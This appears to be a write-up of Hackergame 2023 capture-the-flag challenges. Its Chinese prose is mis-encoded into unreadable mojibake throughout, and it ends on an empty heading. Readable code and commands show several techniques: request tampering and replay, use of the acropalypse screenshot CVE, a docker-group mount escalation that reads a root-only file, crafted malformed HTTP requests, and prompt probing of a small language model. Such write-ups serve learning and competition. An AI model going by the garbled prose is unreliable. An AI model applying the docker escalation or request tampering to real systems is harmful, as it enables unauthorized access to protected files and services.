# Hackergame å¯åŠ¨

ç‚¹å‡»æäº¤åå‘ç° URL ä¸­å­˜åœ¨è¯·æ±‚å‚æ•° `?similarity=` ç„¶åæŠŠå…¶æ”¹å†™ä¸º `100` å°±å¯ä»¥è·å– flagã€‚

## çŒ«å’ªå°æµ‹

ä»Šå¹´ç«Ÿç„¶å¯ä»¥å±•ç¤ºæµ‹è¯•åˆ†æ•°ï¼Œ~~è¿™æ ·å°±å¯ä»¥æš´åŠ›æšä¸¾äº†~~ã€‚

å‰ä¸¤é“é¢˜æš´åŠ›æšä¸¾ç»“æœæ˜¯ `12` å’Œ `23`ã€‚

ç¬¬ä¸‰ä¸ªç»è¿‡ Google æœç´¢å¯ä»¥å¾—åˆ° `CONFIG_TCP_CONG_BBR`ã€‚

æœ€åä¸€ä¸ªåˆ©ç”¨ CHAT GPT æŠŠå¸¦æœ‰è®¡ç®—æœºç›¸å…³ä¼šè®®ï¼ˆå°¤å…¶æ˜¯ç¼–ç¨‹è¯­è¨€çš„ï¼‰ä¾‹ä¸¾å‡ºæ¥ï¼Œç„¶åæšä¸¾å¸¦å…¥å¯å¾— `ECOOP`ã€‚

## æ›´æ·±æ›´æš—

æ‰“å¼€ OBS å½•åˆ¶ï¼Œç„¶åä¸€ç›´æŒ‰ç©ºæ ¼ï¼Œç­‰åˆ° flag å‡ºç°ï¼Œç„¶åç»“æŸå½•å±ã€‚å—¯è¿™æ ·ä»å½•å±ä¸­æš‚åœå°±å¯ä»¥çœ‹åˆ° flag äº†ã€‚

## æ—…è¡Œç…§ç‰‡ 3.0

### é¢˜ç›® 1-2

ä½¿ç”¨ä½¿ Google Lens åæŸ¥å›¾ç‰‡ï¼Œå‘ç°ä¸€é‚£å—å¥–ç‰Œå…¶å®æ˜¯è¯ºå¥–å¥–ç‰Œï¼Œè¿˜æ˜¯ç‰©ç†å’ŒåŒ–å­¦å¥–çš„ã€‚é€šè¿‡ M.KOSHIBA å®šä½åˆ°è·å¾—ä¸»æ˜¯ `Masatoshi Koshiba`ï¼ˆä¸œäº¬å¤§å­¦ï¼‰ã€‚è®¿é—®ä¸œäº¬å¤§å­¦çš„è¯ºè´å°”å¥–å±•è§ˆ [Science Gallery The University of Tokyo](https://www.s.u-tokyo.ac.jp/en/gallery/nobelprize/)ï¼Œå¯ä»¥ç¡®å®šæœ€æ™šå‡ºç”Ÿçš„æ˜¯ `Takaaki Kajita`ï¼Œ1959 å¹´ç”Ÿã€‚è·å¾—è¯ºå¥–é‚£å¹´æ˜¯ 2015 å¹´ï¼Œæ ¹æ® [Wikipedia](https://en.wikipedia.org/wiki/Takaaki_Kajita) æä¾›çš„ä¿¡æ¯ï¼š

```
He became director of the Center for Cosmic Neutrinos at the Institute for Cosmic Ray Research (ICRR) in 1999. As of 2017, he is a Principal Investigator at the Institute for the Physics and Mathematics of the Universe in Tokyo, and Director of ICRR.
```

ä»ä¿¡æ¯ä¸­å¯ä»¥è‚¯å®šè·å¾—è¯ºå¥–æ—¶æ‰€åœ¨çš„æœºæ„æ˜¯ `ICRR`ã€‚

é€šè¿‡ç¬¬äºŒå¼ å›¾ç‰‡å­¦é•¿è„–å­ä¸Šçš„æŒ‚ç»³ä¸­çš„ `STATPHYS28` ç¡®å®šå­¦é•¿è¿™æ—¶åº”è¯¥åœ¨å‚åŠ è¿™ä¸ªæ´»åŠ¨ã€‚è¿›å…¥æ´»åŠ¨ [å®˜ç½‘](https://statphys28.org/)ï¼Œå®˜ç½‘å±•ç¤ºçš„æ—¶é—´æ˜¯å’Œåœ°ç‚¹åˆ†åˆ«æ˜¯ï¼š

```
DATE Date August 7th-11th, 2023

VENUE On-site : The University of Tokyo, Hongo campus, Tokyo, Japan
```

åˆ©é€šå°æ—¶é—´æ®µèŒƒå›´æšä¸¾ï¼Œå¯ä»¥å¾—åˆ°å½“æ—¶çš„æ—¥æœŸæ˜¯ `2023-08-10`ï¼Œæäº¤ç­”æ¡ˆè·å¾— flagã€‚

### é¢˜ç›® 3-4

åŒæ ·ä½¿ç”¨ Google Lens å¯¹ç¬¬ä¸‰å¼ å›¾ç‰‡åæŸ¥å¯ä»¥å®šä½å›¾ä¸­åœ°ç‚¹æ˜¯ [Big Fountains, Ueno Park ä¸Šé‡å…¬åœ’ å¤§å™´æ°´ - GoogleÂ Maps](https://www.google.com/maps/@35.7171566,139.7748063,17.66z?entry=ttu "Big Fountains, Ueno Park ä¸Šé‡å…¬åœ’ å¤§å™´æ°´ - Google Maps")ã€‚ç„¶åç»“åˆ `2023-08-10` ä»¥åŠ `ä¸Šé‡å…¬åœ’ å¤§å™´æ°´`ï¼ˆè¿™é‡Œç”¨æ—¥æ–‡æ‰ä¼šæŸ¥åˆ°ï¼‰ç»„åˆä¸º `ä¸Šé‡å…¬åœ’ å¤§å™´æ°´ 8 æœˆ 10 æ—¥` è¿›è¡Œ Google æœç´¢ï¼Œå¯ä»¥å¾—åˆ° [å…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023](https://umeshu-matsuri.jp/tokyo_ueno/)ã€‚ç„¶åæ³¨æ„åˆ° `2023 å¹´ 8 æœˆ 10 æ—¥ï¼ˆæœ¨ï¼‰ï½13 æ—¥ï¼ˆæ—¥ï¼‰é–‹å‚¬`ã€‚å¯ä»¥è‚¯å®šå°±æ˜¯è¿™ä¸ªæ´»åŠ¨äº†ã€‚å‘ä¸‹æµè§ˆé¡µé¢æ‰¾åˆ° `INFORMATION æœ€æ–°æƒ…å ±` å‘ç° [æ±äº¬ ãƒœãƒ©ãƒ³ãƒ†ã‚£ã‚¢STAFFå¤§å‹Ÿé›†ï¼ï¼ç¬¬ï¼–å›ã€Œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023ã€](https://umeshu-matsuri.jp/tokyo_staff/) å¯ä»¥ç¡®å®šå¿—æ„¿è€…é“¾æ¥æ˜¯ `https://ws.formzu.net/dist/S495584522/` è¿›ä¸€æ­¥å¾—åˆ°ç¼–å· `S495584522`ã€‚

è‡³äºå›¾ä¹¦é¦†å‚è§‚èŠ±è´¹äº†å¤šå°‘æ—¥å…ƒï¼Œæˆ‘çŒœåº”è¯¥æ˜¯ `æ±äº¬å›½ç«‹åšç‰©é¤¨`ã€‚å»å®˜ç½‘çœ‹äº†ä¸‹å‘ç°æ˜¯ `1000` æ—¥å…ƒï¼Œç„¶åè¾“å…¥å‘ç°ä¸æ­£ç¡®ï¼ˆå…¶å®è¿™ä¸ªæœ‰åˆ†ç±»çš„ï¼Œå½“æ—¶æ²¡ä»”ç»†çœ‹ä¹Ÿæ²¡æƒ³ï¼Œåæ¥å¹²è„†ä¸çœ‹æš´åŠ›äº†ï¼‰ï¼Œç„¶åç”¨æš´åŠ›æšä¸¾äº†å¤§èŒƒå›´æ•°å­—å‘ç°ä¹Ÿä¸å¯¹ã€‚åæ¥æƒ³æƒ³~~è¯¥ä¸ä¼šæ˜¯ 0 å§~~ï¼Œç»“æœå¡« `0` è¿›å»ï¼Œç«Ÿç„¶è·å¾—äº† flagã€‚

### é¢˜ç›® 5-6

ä»å­¦é•¿å‚åŠ çš„æ´»åŠ¨ç½‘ç«™æä¾›çš„ä¿¡æ¯å¯ä»¥ç¡®å®šå­¦é•¿å½“æ™šè¦å» `Hongo campus` è¿›è¡Œé›†åˆä¸­æ–‡åç§°å« `å®‰ç”°è®²å ‚`ï¼ˆå…¶å®ä¹‹å‰æ²¡æ³¨æ„åˆ°é‚£ä¸ª STATPHYS28 ï¼Œç„¶åè‡ªå·±æŒ‰å½©è™¹æ¡¥æ¨æµ‹çš„ä¿¡æ¯ä¹±å¡«äº†å¥½ä¹…ã€‚åæ¥æ³¨æ„åˆ°é‚£ä¸ª STATPHYS28 æ´»åŠ¨ï¼Œç„¶åç›´æ¥å°±è¯•äº†è¿™ä¸ªåœ°å€ï¼Œçœ‹å¥½å¤šé¢˜è§£éƒ½æ˜¯çœ‹æ—¥ç¨‹è¡¨çš„ï¼Œè¿™æ ·ä¸Šæ¥ç›´æ¥èƒ½å¡«å¯¹ç®—æ˜¯è¿æ°”å§ã€‚è¯´åˆ°è¿™æˆ‘é‚£ä¸ªæ—¥æœŸä¹Ÿæ˜¯æš´åŠ›çš„ï¼Œæ˜¯åçŸ¥é“ STATPHYS28 æ‰èƒ½ç¡®å®šæ—¥æœŸçš„ï¼‰ã€‚

å…³äºâ€œä½ åœ¨ JR ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£å¤–çœ‹åˆ°ã€Œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ã€â€çš„è¿™ä¸ªé—®é¢˜ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œ Google æœç´¢ï¼Œä¸è¿‡è¿™é‡Œè¦ç”¨å…¨æ—¥è¯­ï¼ˆä¸ç„¶å¥½åƒæœç´¢ä¸å‡ºæ¥ç»“æœï¼‰ã€‚æŠŠ `ä¸Šé‡ç«™` æ›¿æ¢ä¸º `ä¸Šé‡é§…`ï¼Œ`ï¼†` æ›¿æ¢ä¸º `ã‚¢ãƒ³ãƒ‰`ï¼Œç„¶åç»„åˆæœç´¢ `ãƒœã‚¿ãƒ³ã‚¢ãƒ³ãƒ‰ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ ä¸Šé‡é§…` ï¼Œå¾—åˆ° [ãƒœã‚¿ãƒ³ã‚¢ãƒ³ãƒ‰ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ on Instagram | Hashtags](https://www.instagram.com/explore/tags/%E3%83%9C%E3%82%BF%E3%83%B3%E3%82%A2%E3%83%B3%E3%83%89%E3%82%AB%E3%83%95%E3%83%AA%E3%83%B3%E3%82%AF%E3%82%B9/)ï¼Œç‚¹å‡»é“¾æ¥è¿›å»å‘ç°ç²‰è‰²æµ·æŠ¥ä¸Šçš„åŠ¨ç‰©æ˜¯åª `ç†ŠçŒ«`ã€‚

å…³äºåœ¨â€œå‡ºç«™å¤„é™„è¿‘å»ºç­‘çš„å±‹é¡¶å¹¿å‘Šç‰Œä¸Šâ€çš„è¿™ä¸ªé—®é¢˜ï¼Œä»ç¬¬å››å¼ å›¾ç‰‡çœ‹ä½ç½®åº”è¯¥æ˜¯ä»»å¤©å ‚ï¼Œé€šè¿‡çº¿è·¯æ¨æµ‹ä¸‹è½¦åœ°ç‚¹åº”è¯¥æ˜¯æ¶©è°·ã€‚æ—¢ç„¶æœ‰è£¸çœ¼ 3Dï¼Œè€Œä¸”è¿˜æ˜¯åœ¨æ¶©è°·ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±æ˜¯ç§‹ç”°çŠ¬ï¼ˆè¿™ä¸ªäº‹æƒ…æ¯”è¾ƒå‡ºåï¼‰ã€‚æ‰€ä»¥æœ€åä¸€ç©ºç­”æ¡ˆæ˜¯ `ç†ŠçŒ«+ç§‹ç”°çŠ¬`ã€‚

## èµ›åšäº•å­—æ£‹

è¿™é“é¢˜ä½ å’Œ AI ä¸‹è‚¯å®šæ˜¯ä¸‹ä¸è¿‡æˆ–è€…æ˜¯å¹³å±€çš„ï¼Œæ‰€ä»¥è¦åˆ©ç”¨ç‰¹æ®Šæ–¹æ³•ã€‚æ‰“å¼€æµè§ˆå™¨ Dev å·¥å…·ï¼Œæ‰¾åˆ° Network é€‰é¡¹å¡ï¼Œç„¶åä¸‹ä¸€ä¸ª (0,0) ä½ç½®ã€‚ Bot ä¹Ÿä¼šæŒ‰ç…§ä½ ä¸‹çš„ä½ç½®æŒ‰ç…§ç­–ç•¥ä¸‹ï¼Œä½†æ˜¯ä¸è¦ç†ä¼š ã€‚åœ¨ Network é€‰é¡¹å¡ä¸­å·²ç»å‘é€çš„è¯·æ±‚ä¸Šå³é”® copy as fetchï¼Œç„¶åè·³è½¬åˆ° console é€‰é¡¹å¡ï¼ŒæŠŠåˆšæ‰çš„è¯·æ±‚ç²˜è´´è¿›å»ï¼Œæ”¹ä¸€ä¸‹ä½ç½®ä¸º (1,1)ï¼Œè¿™æ ·å°±ä¼šè¦†ç›–æ‰ bot ä¸‹çš„ä½ç½®ã€‚ç„¶åå†æ‰‹åŠ¨ä¸‹ (2,2)ï¼Œå°±å¯ä»¥æ’æˆä¸€æ¡ç›´çº¿äº†ï¼Œå°±å¾ˆå®¹æ˜“èµ¢ bot è·å– flag äº†ã€‚

## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

ä»æè¿°ä¿¡æ¯å¯ä»¥çœ‹åˆ° **è°·æ­Œã€äº²å„¿å­ã€** ä»¥åŠ **è¿ç³»ç»Ÿéƒ½æ²¡å¿ƒæ€å‡çº§** è¿˜æœ‰æˆª **æˆªå›¾** å¯ä»¥è”æƒ³åˆ° GooglePixel çš„æˆªå±çš„ CVEï¼Œæ‰¾ä¸€ä¸ªå¤ç°çš„ [ç½‘ç«™](https://acropalypse.app/) å°±å¯ä»¥è·å–åˆ°å›¾ç‰‡ä¸‹éƒ¨åˆ†ã€‚

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

è¿™ä¸ªå°±æ˜¯å†™è¯·æ±‚çš„é—®é¢˜äº†ï¼Œä¸Šä»£ç ï¼š

```python
import json  
import time  
  
import requests  
  
session = requests.Session()  
  
initial_cookies = {  
    "session": ""}  
session.cookies.update(initial_cookies)  
  
response = session.post("http://202.38.93.111:10021/api/getMessages")  
response.encoding = 'utf-8'  
data = json.loads(response.text)  
results = {}  
for i, message in enumerate(data["messages"]):  
    if "text" in message and "hack[" in message["text"]:  
        results[i] = {'delay': message["delay"], 'text': message["text"]}  
  
init_time = time.time()  
  
for id, v in results.items():  
    send_time = init_time + v['delay']  
    current_time = time.time()  
    delay_seconds = send_time - current_time  
    if delay_seconds > 0:  
        time.sleep(delay_seconds)  
    payload = {'id': id}  
    headers = {'Content-Type': 'application/json'}  
    response = session.post('http://202.38.93.111:10021/api/deleteMessage', data=json.dumps(payload), headers=headers)  
    response.encoding = 'utf-8'  
    if response.status_code == 200:  
        print(f"Sent ID {id} at {send_time} seconds.")  
        print(f"Response content: {json.loads(response.text)}")  
    else:  
        print(response.text)  
        print(f"Failed to send ID {id} at {send_time} seconds. Status code: {response.status_code}")  
  
response = session.post('http://202.38.93.111:10021/api/getflag')  
print(response.text)  
session.close()
```

æ‰§è¡Œåè‡ªåŠ¨è·å¾— flagã€‚

## è™«

æ’­æ”¾éŸ³é¢‘å¯ä»¥åˆ¤æ–­è¿™ä¸ªé—®é¢˜åº”è¯¥æ˜¯æ— çº¿ç”µé—®é¢˜ã€‚åˆ©ç”¨ç”µè„‘ä¸Šçš„ `MMSSTV` æˆ–è€…æ˜¯æ‰‹æœºä¸Šçš„ `Robot36` å°±æ¥æ”¶é¢˜ç›®æä¾›çš„éŸ³é¢‘å°±å¯ä»¥è·å–åˆ° flagã€‚

## JSON âŠ‚ YAML?

### JSON âŠ„ YAML 1.1

ç»è¿‡æŸ¥è¯¢ä¸€ç¯‡åä¸º [JSON is not a YAML subset](https://john-millikin.com/json-is-not-a-yaml-subset) çš„ç½‘ç«™å¯ä»¥å¾—åˆ° JOSN åœ¨è½¬ YAML1.1 æ—¶ä¼šæŠŠå€¼ä¸­çš„ç§‘å­¦è®¡æ•°æ³•è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ç„¶åæ„é€ ä¸€ä¸ªå¸¦æœ‰ç§‘å­¦æŠ€æœ¯çš„çš„ JSON  `{"a": 1e2}`ã€‚å°±å¯ä»¥è·å¾— flag äº†ã€‚å½“ç„¶ä¹Ÿä¸æ­¢è¿™ä¸€ç§æ–¹å¼ï¼ŒJSON é‚£è¾¹è¿˜æœ‰å¯èƒ½æº¢å‡ºï¼ŒåŒæ ·å’Œ YAML è§£æçš„ç»“æœä¸ä¸€æ ·ã€‚

### JSON âŠ„ YAML 1.2

ç»æŸ¥è¯¢ä¸€ç¯‡åä¸º [# Why not use the YAML 1.2 standard? - we don't need a new standard!](https://hitchdev.com/strictyaml/why-not/ordinary-yaml/) çš„ç½‘ç«™å¯ä»¥å¾—åˆ° TAML 1.2 ä¸­çš„é”®ä¸å¯ç”¨é‡å¤çš„ç»“è®ºã€‚ç„¶åå°±å¯ä»¥æ„é€ ä¸€ä¸ªå¸¦æœ‰é‡å¤é”®çš„ JSONï¼š`{"foo": 0,"foo": 0}`ï¼Œè¾“å…¥è¿›å»å¼•å‘å¼‚å¸¸å°±å¯ä»¥è·å¾— flag äº†ã€‚

## Git? Git!

ç”¨ `git reflog` æŸ¥çœ‹å¼•ç”¨çš„å†å²æäº¤è®°å½•ï¼Œå¾—åˆ° `505e1a3 HEAD@{2}: commit: Trim trailing spaces`ã€‚ç„¶åå† `git reset --hard 505e1a3` å°† HEAD æŒ‡å‘è¯¥ç‰¹å®šæäº¤ã€‚ç„¶å `cat README.md | grep flag` å°±å¯ä»¥çœ‹åˆ° flag äº†ã€‚

## HTTP é›†é‚®å†Œ

### æ²¡æœ‰çŠ¶æ€â€¦â€¦å“ˆï¼Ÿ

çº¯è‡ªå·±æƒ³å‡ºæ¥çš„æœ‰é—®é¢˜çš„è¯·æ±‚ï¼Œåœ¨è¿™ä¹‹å‰éƒ½ä¸çŸ¥é“æœ‰æ²¡çŠ¶æ€è¿™ä¸€è¯´ã€‚~~æ²¡æƒ³åˆ°æˆ‘è¿™ BUG ä½“è´¨è¿˜èƒ½åœ¨è¿™é“é¢˜ç”¨ä¸Š~~ã€‚

```
GET / \r\n
Host: example.com\r\n\r\n
```

### 12 ç§çŠ¶æ€ç 

å‚è€ƒçš„ç½‘ç«™ [HyperText Transfer Protocol (HTTP)](https://http.dev/)

#### 100

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n\r\n
```

#### 200

```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 206

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=10-100\r\n\r\n
```

#### 304

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-267"\r\n\r\n
```

#### 400

```
GET / HTTP/1.1\r\n
Host: \r\n\r\n
```

#### 404

```
GET /a HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 405

```
A / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 412

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Fri, 1 Jan 2021 00:00:00 GMT\r\n\r\n
```

#### 413

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 10000000000000\r\n\r\n
```

#### 414

```
GET /<â€¦a_long_URIâ€¦> HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 416

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=25000-75000\r\n\r\n
```

#### 505

```
GET /a HTTP/2.1\r\n
Host: example.com\r\n\r\n
```

## Docker for Everyone

åˆšå¼€å§‹ç”¨ docker çš„æ—¶å€™ä¹Ÿæ³¨æ„åˆ°äº†æœ‰ docker ç»„ç”¨æˆ·ä¼šè·å¾—è¯»å–ä»… root ç”¨æˆ·æ‰å¯ä»¥è¯»å–æ–‡ä»¶çš„æƒé™é—®é¢˜ã€‚æ‰€ä»¥è¿™é“é¢˜å°±å¯¹æˆ‘æ¥è¯´å¾ˆç®€å•äº†ã€‚

```shell
cd /            #è¿›å…¥æ ¹ç›®å½•
ls -la          #æŸ¥çœ‹flagé“¾æ¥æŒ‡å‘ä½ç½®
docker run -it --rm -v /dev/shm/:/x/ alpine #æŒ‚è½½flagçˆ¶æ–‡ä»¶å¤¹åˆ°å®¹å™¨å¹¶å¯åŠ¨
cd /x           #è¿›å…¥æŒ‚è½½ç›®å½•
cat /flag       #è¯»å–flag
```

## æƒœå­—å¦‚é‡‘ 2.0

è¿™é“é¢˜æŒ‰ç…§è§„åˆ™åç€æ¨å°±å¯ä»¥äº†ï¼Œå­—å…¸é‡Œå­—ç¬¦ä¸²ä¸‹è½½ä¸‹æ¥çš„éƒ½æ˜¯ 23 ä½é•¿åº¦ï¼Œä½†å®é™…ä¸Šè¦æ±‚æ˜¯ 24 ä½ã€‚å¯ä»¥å…ˆæŠŠ get_code_dict() å¤–çš„è°ƒç”¨ check_equals çš„å‡½æ•°æ³¨é‡Šæ‰ï¼Œç„¶åå¯ä»¥è¯•ç€æ‰‹åŠ¨æŒ‰ç…§è§„åˆ™åå‘è¡¥å…¨å°±å¯ä»¥äº†ã€‚å› ä¸ºæŒ‰ç…§è§„åˆ™åå‘ç¬¦åˆçš„è¡¥å…¨çš„åœ°æ–¹æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨ä¸€äº›æ— ç”¨çš„å­—ç¬¦ä½œä¸ºè¡¥å…¨æ¯”å¦‚è¯´ `_` å­—ç¬¦ï¼Œå¯ä»¥å…ˆå°è¯•ç”¨ `_` å¯¹åŸæœ‰å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œç„¶åå‘ç°ä»–ä¼šä¸ä¼šå½±å“è§£å¯†çš„ç»“æœï¼Œç„¶åä¸å½±å“å°±æ›¿æ¢ã€‚ç„¶åå°è¯•å¤šè¡¥å…¨å‡ æ¬¡å°±å¾—åˆ°ä¸‹é¢çš„ä»£ç ã€‚ä¹‹åä½ ä¼šå‘ç°å…¶å®è¢«æƒœå­—å¦‚é‡‘åŒ–åçš„æŸäº›å­—ç¬¦æ˜¯ä¸å‚ä¸åˆ°è§£å¯†è¿ç®—çš„ï¼Œå°±æ¯”å¦‚ä¸‹é¢ä»£ç ä¸­å¸¦æœ‰ `_` çš„å­—ç¬¦ã€‚

```python
def check_equals(left, right):  
    if left != right: exit(1)  
  
  
def get_code_dict():  
    code_dict = []  
    code_dict += ['nymeh1niwemflcir}echaet_']
    code_dict += ['a3g7}kidgojernoetlsup?h_']
    code_dict += ['ulwe!f5soadrhwnrsnstnoeq']  
    code_dict += ['cte{l-findiehaai{oveatas']  
    code_dict += ['tye9kxborszstguyd?!blm-p']  
    check_equals(set(len(s) for s in code_dict), {24})  
    return ''.join(code_dict)  
  
  
def decrypt_data(input_codes):  
    cod_dict = get_code_dict()  
    output_chars = [cod_dict[c] for c in input_codes]  
    return ''.join(output_chars)  
  
  
if __name__ == '__main__':  
    flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,  
                         17, 118, 36, 25, 13, 89, 90, 3, 63, 25,  
                         31, 77, 27, 60, 3, 118, 24, 62, 54, 61,  
                         25, 63, 77, 36, 5, 32, 60, 67, 113, 28])  
    check_equals(flag.index('flag{'), 0)  
    check_equals(flag.index('}'), len(flag) - 1)  
    print(flag)

```

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

é€šè¿‡ `asciinema cat asciinema_restore.rec` å¯ä»¥å¾—åˆ°ï¼š

```
%
stage % sha256sum flag.js
6bbbb91b7adc465fa086ec4ad453bca38beef9967800bf24d046a27b8cb70042  flag.js
%
stage % less flag.js
stage % echo "Execute flag.js with nodejs to get the flag"
Execute flag.js with nodejs to get the flag
%
stage % node flag.js
%
stage %
```

æ‰§è¡Œ `asciinema cat asciinema_restore.rec > flag.js`ï¼Œç„¶åç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ `code --disable-extensions flag.js`ã€‚æŠŠå¸¦æœ‰æ§åˆ¶å­—ç¬¦çš„æ–‡æœ¬å…¨éƒ¨åˆ æ‰å°±å¯ä»¥äº†ï¼Œç„¶åæ‰§è¡Œ `node flag.js` è·å¾— flagã€‚

## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿ

### You Are Smart

æµ‹è¯•äº†å‡ æ¬¡è¾“å…¥ä¿¡æ¯å‘ç°ä¸ä¼šæ”¶åˆ°ä¸Šæ–‡å½±å“ï¼Œè¿™ä¸ªæ¨¡å‹åº”è¯¥æ˜¯ä¸€ä¸ªæ–‡å­—ç»­å†™æ¨¡å‹ï¼ˆåæ¥å»å®˜ç½‘ä¹Ÿè¯å®äº†ï¼‰ã€‚æ‰€ä»¥å°±å°½é‡ç¼–å†™èƒ½è®©ä»–è¯´å‡º you are smart çš„è¯ï¼Œè¯•äº†å¤šä¸ªï¼Œå‘ç° `she is smart he is smart and` ä¼šè®©ä»–è¯´å‡º `kind. She says, "You are welcome, Ben. You are smart too. You are my friend."They hug and smile.They` ç„¶åè·å¾— flagã€‚

### Â Accepted

è¿™ä¸ªæˆ‘ç‰¹åœ°å»å®˜ç½‘æŠŠè®­ç»ƒé›†å’ŒéªŒè¯é›†ä¸‹è½½ä¸‹æ¥ï¼Œæ‰¾å…³äº accepted çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åæŒ‰ç…§æœ€ç›¸å…³æœ€å¤§çš„ä¸ƒä½æ•°å­—ä»¥ä¸‹çš„å•è¯åŠå…¶å˜ä½“å¸¦å…¥ï¼Œæœ€åäººå·¥è¯•äº† n æ¬¡ï¼ˆç´¯æ­»äº†ï¼‰ï¼Œå‘ç° `Apology` å¯ä»¥è®©ä»–è¯´å‡º `accepted. She was so happy and excited. She thanked the old man and ran off to show her friends her new toy.` è·å¾— flagã€‚

æœŸé—´è¿˜å‘ç°ä¸€äº›æœ‰æ„æ€çš„ä¸œè¥¿ã€‚ä¹Ÿå°è¯•å¸¦å…¥è¿‡äººåï¼Œä¸è¿‡æ²¡ä»€ä¹ˆæ•ˆæœã€‚ä¸è¿‡ `Moral` è¿™ä¸ªä¸œè¥¿å°±æ¯”è¾ƒæœ‰æ„æ€äº†ã€‚å¯ä»¥åŠ å…¥å‰ç¼€å¾—åˆ°ä¸€äº›æœ‰æ„æ€çš„ä¸œè¥¿ï¼š

```
> Moral
> of the story: Always be careful and never take risks that could be dangerous.

> AMoral
> The moral of the story is: Listen to your parents and be careful.

> BMoral
> of the story: The moral of the story is: Be kind and respectful to others, even if they are different from you. You never

> CMoral
> of the story: it is important to be careful and not take unnecessary risks.
```

å°±æ¯”è¾ƒç¥å¥‡ï¼Œä¸è¿‡ä¸çŸ¥é“ç”¨æš´åŠ›ä½¿ç”¨ X+Moral ä¼šä¸ä¼šå¾—åˆ° acceptedã€‚

## ğŸª æµå¼æ˜Ÿçƒ

åˆ†æä»£ç å‘ç°ç”Ÿæˆè§†é¢‘çš„ä»£ç æŠŠè§†é¢‘çš„ç»´åº¦ç»è¿‡ä¸€äº›åˆ—è¿ç®—ç»™å±•å¹³äº†ï¼Œè€Œä¸”å±•å¹³åéšæœºæˆªæ–­äº†åé¢çš„ä¸€å®šèŒƒå›´çš„æ•°æ®ã€‚ä½†æ˜¯é€šè¿‡ print å±•å¹³åçš„æ•°æ®å‘ç°åé¢çš„å…ƒç´ éƒ½ä¸º 0ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡éšæœºæ·»åŠ  0 å† reshape å±•å¹³åçš„æ•°æ®ã€‚ä½†è¿™æ ·åšå¯èƒ½è¿‡äºéº»çƒ¦ï¼Œå› ä¸ºåŸºäºæ¨æµ‹çš„é•¿å®½è¿˜è¦ç¬¦åˆæ·»åŠ  0 åçš„æ•°æ®æ‰èƒ½ reshapeã€‚æ‰€ä»¥ä¸å¦¨æ¢ä¸€ä¸ªæ€è·¯ï¼Œä¸€å¸§ä¸€å¸§çš„çœ‹è§†é¢‘ã€‚é€šè¿‡ç”Ÿæˆä»£ç çš„è§†é¢‘çš„æ–­è¨€è¯­å¥å¯ä»¥æ¨æ–­è§†é¢‘çš„é•¿å®½ä¸æ˜¯ 10 çš„å€æ•°ï¼Œç„¶åæš´åŠ›æšä¸¾è§†é¢‘çš„å®½åº¦ï¼Œæœ€åç¡®å®šåœ¨ `427`ï¼ˆ~~æ€ä¹ˆæ˜¯é‚¦é‚¦~~ï¼‰ã€‚ç„¶åå¯ä»¥é€šè¿‡ offset è¿›è¡ŒæŠ½å¸§æ¥æŸ¥çœ‹è§†é¢‘ã€‚æœ€åå¯ä»¥å±•ç¤ºè§†é¢‘ä¸­å¸¦æœ‰ flag å¸§çš„ä»£ç ï¼š

```python
import cv2
import numpy as np


def generate_first_frame(data, frame_width, frame_height, offset):
    frame_size = frame_width * frame_height * 3
    start = frame_size * offset
    end = start + frame_size
    frame_data = data[start:end]

    return np.frombuffer(frame_data, dtype=np.uint8).reshape((frame_height, frame_width, 3))


if __name__ == "__main__":
    frame_width = 427
    frame_height = 1000
    frame_offset = 66
    with open("video.bin", "rb") as file:
        data = file.read()
    first_frame = generate_first_frame(data, frame_width, frame_height, frame_offset)
    cv2.imwrite("frame.jpg", first_frame)
```

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ

### Â å°è¯•ç‰›åˆ€

ä½¿ç”¨ `pngout`ï¼ŒæŠŠå‹ç¼©å®Œå›¾ç‰‡æäº¤ä¸Šå»å°±å¯ä»¥è·å– flag äº†ã€‚

```
pngout image.png 
 In:    5845 bytes               image.png -c2 -f5
Out:    1262 bytes               image.png -c3 -f0 -d2, 3 colors
Chg:   -4583 bytes ( 21% of original)
```

## Komm, sÃ¼sser Flagge

